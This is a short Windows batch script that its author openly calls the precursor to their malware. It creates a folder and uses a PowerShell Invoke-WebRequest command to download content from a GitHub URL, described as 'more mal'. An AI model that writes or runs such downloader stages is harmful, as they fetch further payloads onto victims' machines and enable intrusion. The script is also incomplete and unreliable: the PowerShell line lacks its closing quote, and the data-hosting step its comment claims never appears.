REM the precursor to my elite malware, creates a directory then moves to it downloads more mal from github and hosts sensitive data on a webserver

REM create the directory
md myMal

REM move to the directory
cd myMal

REM download the files from github
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bwebb3234' -OutFile malz.txt